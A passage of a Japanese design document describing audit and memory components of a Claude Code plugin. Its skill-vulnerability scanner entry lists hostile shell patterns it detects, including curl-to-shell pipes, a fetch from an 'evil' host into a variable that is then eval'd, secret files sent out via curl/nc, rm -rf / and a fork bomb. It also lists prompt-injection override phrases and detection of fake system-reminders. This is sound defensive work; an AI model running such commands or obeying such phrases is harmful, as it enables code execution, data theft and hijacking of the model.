# コンポーネント詳細 — fleet運用・記憶温度・環境衛生検出器

CLAUDE.md のコンポーネント表の詳細版（SoT）の一部。全体索引は [components.md](components.md) を参照。
新コンポーネント追加・既存変更時は、該当ドメインのこのファイルに詳細を書き、
CLAUDE.md のサマリ表には 1 行（名前 + 一言 + 参照）だけ追記する。

## skill_vuln_scan の shell scope 契約（#555 / #556 / #557）

配布物作者が任意に選べる Markdown fence の info string は信頼境界にしない。
backtick/tilde fence（未閉じなら CommonMark 同様 EOF まで）は info string を問わず、4スペース字下げ code block と
`.sh`/`.bash` 全体も shell 候補として扱う。Markdown 表は `|` で始まり `|` で終わる
行形状を継続判定側で除外する。物理改行は末尾 `|` / `\\` に加え、未閉じ `$(`、
backtick、single/double quote を中央の論理行結合で正規化する。heredoc は
`<<WORD` / `<<-WORD` / quoted WORD の開始・終端を認識し、sh/bash/zsh/ksh/dash が
実行する本文だけを検査対象に残す。`cat` 等の本文と終端は data zone とし、comment
除去・論理行結合・物理行 pattern/flow 検査を適用しない。完全な shell parser、shell
以外の言語意味解析、ファイル横断 producer/consumer、検出後の reject/advisory 判断は
引き続き対象外。

| コンポーネント | 説明 |
|----------------|------|
| recall `[[link]]` 1-hop | `bin/evolve-fleet recall` の芋づる想起（#11）。memory fact 本文中の `[[name]]` リンクを `Fact.links` として抽出し、キーワードヒットした fact の **1-hop 先**（同一 PJ 内）も結果へ追加する（dangling リンク無視・直接ヒットとの重複排除・スコア対象外で末尾 `↳ linked:` 表示・JSON は `linked` フィールド）。既存のキーワード検索挙動は不変で 1-hop 分は加算のみ。ADR-025（決定論キーワード検索・vector/embedding 非採用）と整合。決定論・LLM 非依存（`scripts/lib/fleet/recall.py`、#11） |
| recall validity-aware ranking | grounding metadata をランキングに消費する配線漏れの根治（#74）。背景: `valid_from` / `superseded_at` / `decay_days`（grounding validity）は `scripts/lib/memory_temporal.py` で書込・判定 API（`parse_memory_temporal` / `is_stale` / `is_superseded`）まで実装済みだが、`fleet/recall._score` は TF + name/desc boost のみで temporal validity を**ランキングに消費していなかった**。本変更で `parse_fact_file` が `parse_ok=True` のときのみ `_temporal_validity()`（memory_temporal の既存 API 再利用・再実装なし）を呼び `Fact.is_stale` / `Fact.is_superseded` を埋め、`_score` 末尾（INDEX_PENALTY の後・score>0 のときのみ）で penalty を適用する。**superseded を stale に優先し penalty を stack しない**（`_SUPERSEDED_PENALTY=0.25` / `_STALE_PENALTY=0.4`）。**ハード除外しない**＝stale/superseded でも keyword 一致なら結果に残し順位だけ下げる（RaMem 論文 (iii) のフォールバック保持＝古い記憶も最後の手段として参照可能にする趣旨）。frontmatter 無し（MEMORY.md index 等・`parse_ok=False`）は temporal を計算せず両方 False のまま（後方互換）。注意: 実 writer（`write_temporal_metadata`）は isoformat を quoted 文字列で書くため `is_stale`/`is_superseded` が解釈できる（unquoted ISO は YAML が datetime に自動変換し判定不能になる）。SessionStart 側（`hooks/instructions_loaded.py` の reinforce skip / STALE 警告）は #18 で既に stale/superseded を扱っており本変更の対象外（recall ランキングのみが net-new）。決定論・LLM 非依存（`scripts/lib/fleet/recall.py`、#74） |
| reinforce_memory 配線 | 忘却曲線強化の本番配線（#18）。`memory_temporal.reinforce_memory()`（importance/last_accessed 更新）が実装済みだが caller がテストのみ＝dead code だった問題を解消。(a) recall ヒット時＝`fleet/recall.reinforce_recall_hits(hits)` を CLI `_run_recall` から opt-in 発火（recall() 本体に入れると純粋性契約＝副作用は stderr 警告のみ、を壊し dry 分析でも書き込むため発火境界＝実コマンドに限定）、(b) SessionStart の MEMORY.md 注入時＝`hooks/instructions_loaded.py` の `_reinforce_loaded_memory()`（有効 memory のみ強化、stale/superseded はスキップ＝「よく参照される有効 memory ほど残る」意図に沿わせる）。決定論・LLM 非依存（`scripts/lib/memory_temporal.py` + `fleet/recall.py` + `hooks/instructions_loaded.py`、#18） |
| `memory_capability` | 記憶操作 capability section（read/use/write/maintain・#19, tech-eval）。発端: OPD-Evolver（arXiv 2606.17628）の「経験を保存することと進化術を learn することは別」という問題提起を受け、記憶を read/use/write/maintain の観点で評価し死蔵・未活用を可視化する経路が無かった。fitness の重み軸にはせず outcome_metrics と同じ advisory レーンに置く（既存4軸の重み再校正による退行リスクを避け、issue が懸念する既存軸との重複をそもそも発生させない）。**4観点→3軸統合の理由**: `reinforce_memory(filepath, reason)` の `reason` はファイルに書かれず（ログ用）、かつ reinforce は SessionStart で有効 memory 全件に発火する（`_reinforce_loaded_memory`）ため frontmatter から「recall 由来か注入由来か」を事後復元できず read を独立軸にできない（静的存在指標は near-constant）。→ write（temporal frontmatter あり率）/ maintain（非 stale かつ 非 superseded の健全率）/ use_read（last_reinforced_at あり率 + update_count 中央値、「per-memory の recall 回数でなく PJ 活性 proxy」の限界注記付き）の3軸。observability builder `sections_memory.build_memory_capability_section` を `_OBSERVABILITY_BUILDERS` に登録し markdown/構造化 両経路へ advisory surface（沈黙境界＝memory 実体0件は None、outcome と同契約）。設計は senpai 独立検証で「advisory 形態 GO・read/use 統合・slug 解決経路明記」を反映。**namespace バグ根治（実環境 dogfood 発見）**: memory dir は CC の `~/.claude/projects/<path-encoded>/memory`（cwd 絶対パスの `/`→`-`）に在り、`resolve_pj_slug` の repo-basename slug（例 `evolve-anything`）とは名前空間が別物。初版は `resolve_pj_slug` を使ったため別 dir を指し section が**常に沈黙**していた（synthetic fixture が同じ誤 slug で dir を作り実装と握り合って緑＝[[learning_synthetic_fixture_false_confidence]] の再演）。`pj_slug.resolve_cc_memory_dir` を**単一ソース**として新設し memory_capability と #18（reinforce/stale 配線）を両方それへ張替（[[pitfall_copied_parse_convention_partial_fix]] 準拠で read/read desync を防止）。実 PJ dogfood で memory 84 件・3軸算出を確認。決定論・LLM 非依存（`scripts/lib/memory_capability.py` + `scripts/lib/audit/sections_memory.py` + `pj_slug.resolve_cc_memory_dir`、#19） |
| `skill_vuln_scan` | 取り込みスキルの静的脆弱性スキャン section（SkillSpector 型・#13）。発端: 外部由来スキル（SKILL.md プロンプト + 同梱シェルスクリプト）を取り込む際、悪意あるパターン（リモート取得→shell 実行 / 秘密ファイルのネットワーク exfil / 破壊的コマンド / SKILL.md 埋め込み prompt injection / frontmatter の全ツール付与）を見落とす穴があり、それを **決定論・LLM 非依存** で静的検出する経路が無かった。`scan_skills(root)` が `root/skills/` 配下を行単位で走査し `Finding(rel_path,line,category,severity,pattern_id,snippet)` を列挙、`SkillVulnReport(applicable,scanned_files,findings)` を返す。**FP 較正（このリポジトリの偽陽性厳格主義に沿う）**: ① **combo 必須・bare 単体は非検出** — `curl https://...`（単独）は正当な取得なので素通し、`curl http://... | sh` のような shell へ流す combo のみ remote_exec(HIGH)。② **`gh api ... | base64 -d`（GitHub content デコード）は実在 FP** — `base64 -d` 単体は検出せず `base64 -d ... | sh` の combo のみ検出（実 `skills/release-notes-review/SKILL.md` の base64 行を回帰ロックで非検出固定）。③ destructive(MEDIUM) は `rm -rf /`・`~`・`$HOME`・`*` のみで `rm -rf ./build` の相対は非検出、chmod 777 / fork bomb。④ secret_exfil(HIGH) は「秘密ソース（~/.ssh/id_/.aws/credentials/.env/printenv 等）」と「ネット sink（curl/wget/nc/http）」が**同一行に共起**したときのみ（片方だけは非検出）。⑤ prompt_injection(MEDIUM) は ignore/disregard previous・do not tell the user・日本語「これまでの指示を無視」等。⑥ overbroad_tools(LOW) は frontmatter `tools: *`。**対象拡張子は `.md`/`.sh`/`.bash` のみ**（`.py` は FP 抑制のため本 PR 対象外＝follow-up）。除外ディレクトリは testpaths_coverage 同等（`.git`/`__pycache__`/`tests` 等）。配線: observability builder `audit/sections_skill_vuln.build_skill_vuln_section` を `_OBSERVABILITY_BUILDERS` に登録（markdown/構造化 両経路へ自動伝播）。skills/ が無い PJ は None（沈黙）、findings 空は「✓ 評価したが該当なし」、findings あり は ⚠（HIGH を上に並べ rel_path:line evidence）で `classify_section`=critical に落ちる。**follow-up（本 PR 対象外）**: `skills/import/` への PreToolUse 取り込みゲート配線と `.py` スキャン。**実 corpus dogfood**: 実 main checkout の skills/ 42 ファイルを走査し findings 0（base64 FP 非検出を確認）。決定論・LLM 非依存・読み取りのみ（`scripts/lib/skill_vuln_scan.py` + `scripts/lib/audit/sections_skill_vuln.py`、#13）。**#123 マルチステップ攻撃系列の静的フロー検出（本エントリ拡張）**: 行単位検出は「1 行に共起」しか見ないため、`VAR=$(curl http://evil)` → 別行 `eval "$VAR"` のように**取得と実行を複数行に分割**する回避を素通しする穴があった。同一スコープ（`_iter_scopes` がコードフェンス / スクリプト境界で分割）内で**順序を持つ攻撃系列**を検出する `FlowFinding`（行単位 `Finding` とは別枠・`SkillVulnReport.flow_findings`）を追加。2 系列: ⑴ **fetch→変数→exec** — `_FLOW_ASSIGN`（`VAR=...`）の RHS に `_FLOW_FETCH_CMD`（curl/wget/fetch/`gh api`）+ `_FLOW_CMD_SUBST`（`$(...)`/backtick）が在れば「汚染変数」と印を付け、後続行で `_exec_var_regexes(var)`（`eval "$VAR"` / `sh -c "$VAR"` 等）にマッチしたら発火。⑵ **fetch→ファイル→exec** — `_FLOW_FETCH_TO_FILE`（`curl -o f` / `> f` リダイレクト）で保存したファイルを後続行で `_exec_file_regexes(fpath)`（`sh ./f` / `bash f` / `chmod +x f && ./f`）が実行したら発火（`-`/`/dev/*` は `_FLOW_FILE_IGNORE`）。**FP 較正（実コーパス 1560 ファイル dry-run）**: 初回 6 件 FP → `./FILE` 実行判定を**コマンド境界直後のみ**に絞り（散文中の `./path` 言及を除外）全消去。`sections_skill_vuln` を **2 段表示化**（行単位 findings + flow findings を別セクションで surface・HIGH 優先ソート）。決定論・LLM 非依存 |
| `fanout_cost` | fan-out 費用対効果 section（#14, tech-eval, arXiv 2606.13003 "The Illusion of Multi-Agent Advantage"）。発端: 「複数 agent を fan-out すると本当に得か」を自 PJ テレメトリで検証する経路が無く、subagent-guard は件数ゲートのみで「効くか」を見ていなかった。fitness 重みにはせず outcome_metrics と同 advisory レーン。**cost 先行・advantage データゲートの2部構成**: ① cost（非スパース・常時算出）= fan-out session 率（同一 parent session_id が subagent ≥2 体 spawn / subagent ≥1 体 spawn）+ 平均 subagent 数 + agent_type 内訳。token 単位 session join は subagents↔token_usage に綺麗な対応が無いため未対応で subagent 体数を proxy とし注記（捏造しない）。② advantage（floor ゲート付き）= fan-out 群 vs single 群の一発成功率 delta を各群 ≥5 session（`MIN_GROUP_SESSIONS_FLOOR`、outcome_metrics の edit_sessions≥5 に倣う）で算出、未満は「データ不足（サンプル不足）」明示（#15/#10 が踏んだ構造的スパース性への対処）。データ源: subagents.jsonl（agent_type 空除外 #36・`fleet/collectors` と同契約）+ sessions（`outcome_metrics.read_sessions` の union read・#469 を流用し error_count==0 を一発成功）。PJ スコープは `outcome_metrics._normalize_pj` を共有（worktree 安全・#489）。**設計判断**: 効果計測を当初 issue の narrow target（rl-scorer 3軸 vs 単一）に限定せず汎用 subagent fan-out（impl-worker/Explore 等）に拡張（narrow は実運用スパース）。実データ（rl-anything slug・subagents 7,419行）でロジック実証済み: fan-out率 0.69 / 平均 14.84 体 / advantage −0.20（論文の「fan-out 優位は見かけ倒し」と整合する負 delta が小標本で観測）。**現環境注意**: canonical DATA_DIR（evolve-anything）は migrate-data #364 未実行で空、実データは rl-anything dir 残留 + 旧 slug 属性のため current PJ では沈黙（outcome_metrics 等と共通の pre-existing seam・fanout_cost のバグではない）。決定論・LLM 非依存（`scripts/lib/fanout_cost.py` + `scripts/lib/audit/sections_fanout.py`、#14） |
| `memory_contagion` | 評価源バイアスの記憶伝播を audit advisory で検出する section（#73）。発端: 評価源（evaluator source）に偏りがあると、その経験が記憶 / correction に蓄積され将来の提案・採点に伝染する（Memory Contagion・authority bias 増幅）。当 PJ の評価源を **human / machine に決定論で分解**し、機械評価源の蓄積が人間確認源を大きく上回っていないかを surface する（完全に決定論・LLM 非依存・スコア非関与）。**評価源分解の根拠は既存実装を再利用**（再実装しない）: corrections は `correction_semantic.provenance_weight.is_human_correction`（HUMAN_SOURCES={"reflect_confirmed","idiom_dict"} のみ human、それ以外と Stop hook 系は機械）、idioms は `correction_semantic.store.read_idioms` 各 record の `confirmed`（人間が #446 review で承認）を human・未確認（LLM judge 段階）を machine とみなす。`human_total = human_corrections + confirmed_idioms` / `machine_total = machine_corrections + unconfirmed_idioms`。**保守 verdict 4分類**（cry wolf を避ける側に倒す・閾値は `MACHINE_FLOOR=10` / `RATIO=3.0` で実コーパス dry-run 校正前提）: 両ゼロ→applicable=False（沈黙）/ human=0 & machine≥floor→`no_human_baseline`（比較基準なし＝ℹ 扱い・⚠ にしない）/ human>0 & machine≥floor & machine≥RATIO×human→`contagion_risk`（⚠ authority bias の兆候）/ それ以外→`healthy`（小標本・バランス健全）。**PJ slug スコープ厳守**（全 PJ 共通 DATA_DIR pitfall）: corrections.jsonl / correction_idioms.jsonl はいずれも全 PJ 共通ストアなので、capture_rate と同じスコープ方式（corrections は `capture_rate._normalize_pj` + `_project_match`、idioms は `pj_slug_fast(project_dir)` × `store_read_union.pj_slug_match`）で当 PJ 分のみ数える。引数なし cwd 導出は worktree で slug 食い違いを起こすため禁止し、builder は `project_dir` を受けてそこから slug を導出する。builder `build_memory_contagion_section` を `_OBSERVABILITY_BUILDERS` に登録し markdown / 構造化 両経路へ自動伝播（ADR-028）。決定論・LLM 非依存（`scripts/lib/audit/memory_contagion.py` + `scripts/lib/audit/sections_contagion.py`、#73） |
| `memory_guard` | auto-memory 書込境界の runtime 記憶汚染検出（#108）。発端: auto-memory broker が LLM 生成した memory を write する経路に、汚染（prompt injection / secret 漏洩 payload）を検査するゲートが無かった。**設計核**: ① **skill_vuln_scan の較正済みパターンを import 再利用**（本体無改変・二重メンテ回避）し `scan_text(text)→List[ContaminationHit]` で走査。② **reject は `prompt_injection` + `secret_exfil` の 2 カテゴリ限定**（`_REJECT_CATEGORIES`）— remote_exec / destructive / overbroad_tools は memory 本文では正当な記録内容になりうるため検出はするが reject しない（**誤 reject の失敗コスト大**＝有用な記憶を落とす方が汚染通過より高コスト、という非対称を反映）。③ **緊急避難** `resolve_guard_mode`（明示 > env `EVOLVE_MEMORY_GUARD` > 既定 `reject`）で `warn`（書込継続・警告のみ）に降格可、不正値は安全側 `warn`。④ **fail-open** — guard 自体が例外を投げたら write を止めない。**配線**: `auto_memory_broker.ingest_memory_results` が importance 採点前に `inspect_content` で検査し、`reject` モードで汚染ヒットしたら**その memory を consumed 扱い**にして write せず次へ（enqueue に戻さない＝無限リトライ防止・ADR-037 の enqueue→2 相生成と整合）、返り値に `contaminated` / `contamination_hits` を積む。**observability**: `scan_memory_dir(memory_dir)→MemoryContaminationReport` を `audit/sections_memory.build_memory_contamination_section` が `_OBSERVABILITY_BUILDERS` に登録し、既存 memory の汚染を advisory surface（clean は None）。**store_write barrier への配線は意図的見送り**（memory write は hook hot path でなく broker バッチ経路、barrier は DATA_DIR ストア用で memory dir は CC 管理の別名前空間）。TDD（memory_guard / broker / section）・決定論・LLM 非依存（`scripts/lib/memory_guard.py` + `scripts/lib/auto_memory_broker.py` + `scripts/lib/audit/sections_memory.py`、#108）。**#93 拡張（記憶更新の遷移検証・TRUSTMEM 型決定論版）**: 発端: #108 の scan は「新規テキスト単体」の汚染パターンしか見ず、auto-memory が同名（frontmatter `name` 一致）の既存記憶を実質的に「更新」する書込に対して、既存の重要 fact を消す/矛盾する/幻覚混入するリスクを検査していなかった。TRUSTMEM（arXiv 2606.25161）の Memory Transition Verifier（網羅性/保存性/忠実性）の発想を **RL 抜きの決定論版**として同モジュールに追加。**トリガー条件**: 新規書込の frontmatter `name` と一致する既存エントリが `memory_dir` に無ければ検証対象外（`checked=False`・block しない＝大多数の通常書込は無関係で FP リスクゼロ）。同名衝突が見つかった場合のみ3観点を比較: ① **coverage** — 既存 body の「重要行」（8字以上）が新 body に difflib 類似度 0.5 以上で残っているか、残存比率が 0.3 未満なら reject 候補（old body が 2 行未満なら判定不能として保守的にスキップ）。② **preservation** — allowlist フィールド（`metadata.type` のみ）が矛盾する値に上書きされていないか。**description/importance は比較対象から除外**（自然言語の要約・再評価値は「同じ概念の更新」でも正当に書き換わるため denylist 式で全フィールド比較すると通常の健全な更新まで reject する重大 FP になると dogfood で判明・#93 較正）。③ **fidelity** — 冒頭行同士が高い文字列類似度（0.6 以上・主語が同じ疑い）かつ一方にのみ否定マーカー（日本語「ない/禁止/だめ」等・英語 not/never/avoid 等を `\b` 境界で）があるときのみ極性反転を検出（主語が違う疑いのある場合は対象外＝保守的較正）。**配線**: `auto_memory_broker.ingest_memory_results` の write 直前・#108 汚染検出の直後（importance 採点より前）に `inspect_transition` を呼び、reject 候補は書込せず consumed 扱い（再キューしない）。返り値に `transition_checked`/`transition_rejected` を追加。**永続化**: 検証イベント（checked/rejected/matched_name/axes）を新ストア `memory_transition_checks.jsonl` に1件ずつ記録（`_record_transition_event`・`rl_common/store_write.py` の barrier 経由・store_registry に active 登録・retention=permanent・writer_locus=batch）。read 側は `memory_guard.transition_check_counts(slug)`（`rl_common.DATA_DIR` を **call-time** に live 参照＝import 時コピーは monkeypatch 非追従の既知 pitfall #96 を踏むため注意）が pj_slug でスコープ集計。**observability**: `memory_capability.compute_memory_capability` の maintain 軸 evidence に `transition_checked`/`transition_rejected` を追加し、`audit/sections_memory.build_memory_capability_section` の maintain 行に「記憶遷移検証(#93) reject N/M 件」として常時表示（0/0 でも表示・stale/superseded と同列）。**dry-run 契約**: `ingest_memory_results` 自体が evolve の非 dry-run drain（Phase C）でのみ呼ばれる契約（SKILL.md「dry-run 記録可否の一元表」に明記済み・auto-memory ingest は dry-run で一切書かない）ため、新規書込も自然にこの契約を継承（追加のガード不要）。TDD +25件（memory_guard 単体18・auto_memory_broker 統合4・memory_capability/section 3）・決定論・LLM 非依存（`scripts/lib/memory_guard.py` + `scripts/lib/auto_memory_broker.py` + `scripts/lib/memory_capability.py` + `scripts/lib/audit/sections_memory.py` + `scripts/lib/store_registry.py`、#93） |
| `artifacts_hygiene` | artifact 衛生の決定論検出器5件（#124 #125 #126 #129 #155・2026-07-03 PC 環境手動監査の検出器ギャップ起票分 + #155 グローバル hook 二重登録の再発防止）。発端: 手動監査で見つかった「audit の死角」のうち決定論・ゼロ LLM で検出器化できる指摘を issue 化し実装（実例: グローバル CLAUDE.md が 0 バイトのまま放置 / skill-creator の Description Optimization が作る `<skill>-workspace/` 残骸 dir / `SKILL.md.backup` 残置 / `name: gstack` の 2 dir 重複 / グローバル `~/.claude/hooks/record-verbosity.py` がプラグイン `hooks/record_verbosity.py` と同機能なのに独立 Stop hook 登録され二重書込していた #155 Part A）。**5検出器**: ⑴ **#124 `detect_global_claude_md`** — `~/.claude/CLAUDE.md` の未存在 / strip 後空を検出、中身があれば沈黙（healthy は None）。⑵ **#125 `detect_missing_skill_md`** — skill root（`.claude/skills` + plugin レイアウトは `skills/`・`.claude-plugin/plugin.json` ゲートで find_artifacts と整合）直下で SKILL.md を配下に 1 件も持たない dir を列挙、`EXCLUDED_SKILL_DIRS`/dot-dir 除外。⑶ **#126 `detect_backup_files`** — skills 配下の `*.md.bak`/`*.backup`/`*.orig` を列挙。⑷ **#129 `detect_duplicate_skill_names`** — `find_artifacts` 収集後に frontmatter `name` でグルーピングし**実体（非 symlink）2 件以上**のグループのみ発火、symlink wrapper（gstack の `_gstack-command` 等の正規別名参照）は重複計上から除外し `symlink_paths` に区別表示（FP 回避と可視化の両立）。⑸ **#155 `detect_global_hook_plugin_dup`（Part B 再発防止）** — グローバル `~/.claude/settings.json` の hooks と プラグイン `hooks/hooks.json` の hooks を**同一イベントキーごと**に突合し、コマンド文字列から抽出した script の**正規化 basename**（`([\\w.\\-]+\\.py)` → basename → lower + `-`/`_` 除去で `record-verbosity`≡`record_verbosity`）が一致するグローバル側 hook を「残骸疑い」として列挙。event / global 元コマンド / plugin 元コマンド / 正規化名を保持。settings/hooks の読取失敗（未存在・壊れ JSON）は空リストで握り advisory を壊さない。イベント別スコープなので別イベント同名 basename は非該当（FP 回避）。plugin hooks path は `parents[3]`（プラグインルート）から解決。全検出関数は走査 base を**引数で受け**、実 `~/.claude` はデフォルト値解決時のみ読む（テストは tmp_path fixture・実環境非依存）。section builder は `build_advisory_section`（#115 共通枠）経由で `_OBSERVABILITY_BUILDERS` に 5 key（global_claude_md / global_hook_plugin_dup / missing_skill_md / backup_files / duplicate_skill_names）登録＝markdown/構造化 両経路へ surface。builder 追加に伴う evolve result keyset snapshot は追従済み（worker targeted テストでは検出されず頭の full suite が捕捉＝#64/#38 と同型の教訓）。決定論・LLM 非依存（`scripts/lib/audit/sections_artifacts.py`） |
| `memory_hygiene` | memory dir 衛生の決定論検出器3件（#127 #128 #131・同監査起票分）。**3検出器**: ⑴ **#127 索引孤児（`memory_index_orphan.py`）** — MEMORY.md 本文の `[text](file.md)` リンク集合（相対パスは basename 正規化・アンカー付き対象外）と `memory/*.md` 実ファイル集合を突合し、`unindexed_files`（索引に無い実ファイル＝想起されない）/ `indexed_missing`（実体の無い stale リンク）を検出。`memory_capability._memory_files` を再利用、MEMORY.md 不在は検査対象外。実例: update_count 56/61 の高頻度強化 pitfall 2 件が索引から不可視だった。⑵ **#128 frontmatter スキーマ検証（`memory_schema_check.py`）** — `name`（kebab-case 正規表現）/ `description` / `metadata.type`（user/feedback/project/reference の4類型）の欠落・逸脱・不正値を検出。MEMORY.md（索引・frontmatter 無し仕様）は対象外。既知の較正余地: temporal frontmatter だけ持つ既存 memory も「違反」に拾うため over-fire なら対象調整。⑶ **#131 完全重複残骸（`memory_dup_residue.py`・fleet 横断）** — `~/.claude/projects/*/memory/` の dir ペア間で `*.md` 内容 SHA256 集合を突合し、**完全包含（subset）される dir のみ**残骸候補として surface（部分重複は Phase 1 非報告＝FP 抑制）。equal 集合の双方向重複は旧 slug 側 residue 優先→dir 名の決定論タイブレークで片側固定。`PJ_SLUG_ALIASES`（read 層別名 SoT）に載る旧 slug は「rename 由来の可能性大」ラベル。**削除は tar 退避 + rm の手順提案のみ・auto-apply しない**。走査は各 memory dir 直下 `*.md` のみ非再帰・MEMORY.md（PJ ごとに divergence する索引）除外・transcripts（*.jsonl・実環境 1.9GB）非接触。`default_projects_dir` は call-time 関数（module-level ~/.claude Path 定数を `test_observability_isolation_guard` が検出するため）。実例: 旧 rl-anything memory 79 files が現 PJ の完全重複として残置（#45/#47 の read 層 alias fold は読み落としを救うが残骸自体は不可視だった）。3件とも clean 時非表示（None）で `sections_memory.py` から `_OBSERVABILITY_BUILDERS` に 3 key 登録。memory dir 解決は `resolve_cc_memory_dir` 単一ソース（CC パスエンコード・repo-basename slug と混同しない #19）。TDD 28件・決定論・LLM 非依存（`scripts/lib/memory_index_orphan.py` + `memory_schema_check.py` + `memory_dup_residue.py` + `audit/sections_memory.py`） |
| `memory_stale_refs` | audit の Memory Health セクション（`build_memory_health_section`）が memory 本文中のファイルパス言及を stale 検出する既存機構（`path_extractor.extract_paths_outside_codeblocks` でコードブロック外のパス参照を抽出し project_dir / 参照元隣接ディレクトリでの実在確認、confidence 0.95 で auto_fixable 提案）に対する誤検知修正（#252、旧来 spec 未整備だったため本エントリを新設）。**問題**: memory 本文の日本語文中のスラッシュ区切り並列列挙（例:「〜は A.md/B.md/C.md を修正済み」）を単一のネストパス（`project_dir/A.md/B.md/C.md`）と誤読し、実在する複数ファイルを不在誤検知していた。**修正**: 列挙形状の判定を `path_extractor.split_enumeration_segments()`（全セグメントが拡張子付きの独立ファイル名に見えるかのみを判定する純テキスト判定・存在確認は行わない）として分離し、`build_memory_health_section` 側に existence gate を追加。① **実ディレクトリ優先** — 先頭セグメントが project_dir/参照元隣接いずれかで実在するディレクトリなら列挙判定を取り消し従来のネストパス判定（例:「config.d/rules.json」）へフォールバック。② **過半数存在ゲート** — 列挙内 `ceil(n/2)` 以上のセグメントが実在する場合のみ列挙展開しファイル単位で個別 stale 判定、満たさなければ「episodic.db/sessions.db/token_usage.db」のような実ファイルでない DB ストア名の説明的言及とみなし列挙全体をノイズ除外（1セグメントのみ実在＝偶然の同名一致で残り全部を stale FP 化するのを回避、全セグメント不在の本物の列挙を見逃すのは意図したトレードオフ）。実コーパス較正（本 PJ 自身の auto-memory 全件）で初版案（全セグメント無条件展開）の DB ストア名 FP を検出・修正し、before/after で main 分岐と byte-identical（既存6件の真の stale 検出を維持・新規 FP ゼロ）を確認。境界テスト3件（実ディレクトリ優先/過半数未達で抑制/過半数達成で欠損検出）含め TDD +8件（`test_audit_quality_trends.py`）。決定論・LLM 非依存（`scripts/lib/path_extractor.py` + `scripts/lib/audit/memory.py`、#252） |
| `invalid_frontmatter` | YAML frontmatter が壊れて CC が発火できないスキルを直接 surface する observability section（#167）。発端: `frontmatter.parse_frontmatter` が `except yaml.YAMLError: return {}` で不正 YAML を黙って空辞書にフォールバックするため、①壊れた frontmatter（description の非引用スカラーに `トリガー: ` colon-space が入り `yaml.safe_load` が ScannerError 等）のスキルが effort 無し扱いで missing_effort に誤分類され、②CC は SKILL.md の frontmatter を `yaml.safe_load` で読むため name/description/trigger を読めず**自動発火しない**のに、それを surface する検出器が無かった（atlas-breeaders 初回 evolve dogfood で 3 スキルの実 breakage を発見）。**実装3点**: ⑴ 検出コア `frontmatter.detect_frontmatter_error(path) -> Optional[str]`（`---` 開始かつ閉じ `---` ありかつ `yaml.safe_load` が YAMLError／結果が非 dict のときだけ 1 行 error を返す純関数。unterminated＝閉じ `---` 無しは本文冒頭の水平線を frontmatter と誤検知する FP を避け保守的に非検出。空 frontmatter/読取失敗は None。`parse_frontmatter` は `{}` フォールバックに依存する呼び出し元が多数のため**無改変**）。⑵ `effort_detector.detect_missing_effort_frontmatter` が invalid を skip し missing_effort への二重計上を根治（#166 の producer/fixer 修正と相互作用）。⑶ audit advisory section `build_invalid_frontmatter_section`（#115 共通枠 `build_advisory_section`・`_OBSERVABILITY_BUILDERS` に `invalid_frontmatter` key 登録・severity ⚠＝CC 発火不能で重大・clean（0件）時は None で沈黙・**auto-fix せず人手修正提案**）。`detect_invalid_frontmatter(project_dir)` は `.claude/skills/**/SKILL.md` を昇順走査し `is_excluded_skill_path` で archived/backup 除外（agents/rules は将来拡張）。TDD 18件・決定論・LLM 非依存（`scripts/lib/frontmatter.py` + `effort_detector.py` + `audit/sections_invalid_frontmatter.py` + `audit/observability.py`） |
| `self_contamination` | 自己汚染ハルシネーション指紋を測る Layer 2 observability section。発端: 2026-07-10 実測調査（直近5日 261 jsonl vs baseline 400 jsonl の byte-level 照合）で「最近インジェクション/変な回答が増えた」体感の正体が〈opus 1M 長大セッション（heavy-tail 最大 14,884 msg/318MB）の自己汚染ハルシネーション〉と確定（operational 自己汚染 23→49 件/週・生タグ漏出 10→43・外部実 injection ゼロ・fable 頭 5,988 msg で汚染ゼロ＝モデル切替犯人説は反証・Anthropic #70900 型）。live 抑止（Layer 1 hook）の前に**価値と検出精度を証明する Layer 2**として、既存 transcript を audit 実行時に走査する read-only advisory を先行導入（tacchi 設計レビュー条件付き GO: ③スコープ切り下げ明記 / store 新設なし / 実 corpus 較正 / auto-inject 不採用、を反映）。**検出コア** `self_contamination_scan.py`（純関数・ゼロ LLM）: Family A=生タグ漏出（code fence 除外＋invoke 開き+parameter/閉じの構造完全性要求で散文言及 FP 排除）/ B=偽 system-reminder / C-lite=汚染宣言×原文非在（汚染語彙×引用リテラル≥12字×直前 K=5 tool_result への空白正規化照合の 3 条件 AND。**高精度・低再現と明記**、paraphrase 型は仕様上取りこぼす）。tool_result 原文（user record の tool_result/toolUseResult のみ）と assistant text/thinking を厳密分離（`tool_result_texts` は assistant record から決して拾わない＝分離が核心）。operational PJ / 話題 PJ（evolve-anything 自身＝メタ議論で FP 高）を分離集計し section で明示注記。**実 corpus 較正**: 直近7日窓 477 セッション・wall 5s で Family A 43 件 oracle 厳密再現（recall 実質100%）・figma 既知 positive（「write the code」等の偽指示引用）3 件検出・Family C は FP 除去で 48→29 件（precision 約45%＝zero-LLM の実力上限、live claim と meta 議論の分離は LLM 判断領域のため低精度レーンと注記）。advisory は #115 共通枠（`bin/evolve-scaffold-advisory` 経由）・clean/transcript 不在は None 沈黙・⚠＋3 Family 件数＋period-over-period 推移＋代表例（作話 vs 直前 tool_result 原文の対比）。Layer 1 hook の要否は本計測の指紋率推移（07-08 の hook 修正群 #110/#155/#181 後に率が落ちるか＝機会説 vs モデル傾向説の判定ゲート）で決める。既知の将来課題: `_RULE_CITATION` フレーズ列挙は ADR-043（allowlist はモグラ叩き）に照らし文脈直交条件への置換候補。TDD 30件・決定論・LLM 非依存（`scripts/lib/self_contamination_scan.py` + `audit/sections_self_contamination.py` + `audit/observability.py`） |
| `evolve_tier` | モデルティア（HEAD/HARD/NORMAL/MECH/REVIEW ↔ model/effort）一元管理ツール（#193）。発端: 正典が model-routing rule・`agent_tier.TIER_POLICY`・各 PJ の agent frontmatter・settings.json に散在し、モデル変更のたびに全ファイル手動追従が必要だった。2026-07-10 opus 4.8 廃止改定で HEAD が fable⇄sonnet を同日中に往来した実例が「モデル変更を1箇所で一元管理する仕組みが無い」ことを露呈させ、tacchi（設計&レビュー顧問・REVIEW ティア）のレビューで設計を確定（本 issue に反映）。**設計方針**: 正典を `~/.claude/model-tiers.json` という**外部 config**に切り出し、CLI `bin/evolve-tier` で読み書きする。①**set/sync 分離** — `tier_policy.set_tier()`（正典の値そのものを更新・atomic write）と `tier_policy_sync.{plan,apply}_sync()`（正典→実ファイルへの反映）を独立させ、「正典を変える」と「配布先に伝播させる」を別の承認境界にする（sync は既定 dry-run、明示 `--apply` のみ書込）。②**targets 明示列挙**（自動検出は実装しない、設計上の確定事項）— agent frontmatter・settings.json・routing rule のうちどれを sync 対象にするかは config の 